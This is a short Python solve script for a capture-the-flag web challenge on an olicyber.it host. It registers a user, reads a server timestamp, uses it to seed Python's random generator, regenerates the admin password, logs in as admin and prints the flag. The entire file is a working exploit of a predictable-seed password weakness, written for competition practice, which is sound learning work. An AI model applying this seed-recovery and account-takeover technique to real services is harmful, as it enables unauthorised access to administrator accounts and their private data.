import random
import string
import requests
import os
from bs4 import BeautifulSoup
import re

url = "http://privnotes.challs.olicyber.it/"

s = requests.Session()

s.post(url + "register", data={"username":f"{os.urandom(10)}"})
r = s.get(url + "users")
soup = BeautifulSoup(r.text, "html.parser")

raw = soup.find_all("time")[0]["raw"]
random.seed(float(raw))
admin_password = "".join(random.choices(string.ascii_letters + string.digits, k=16))

s.post(url + "login", data={"username": "admin", "password":admin_password})
r = s.get(url + "notes")
flag = re.search(r"flag\{.*?\}", r.text)
print(flag.group())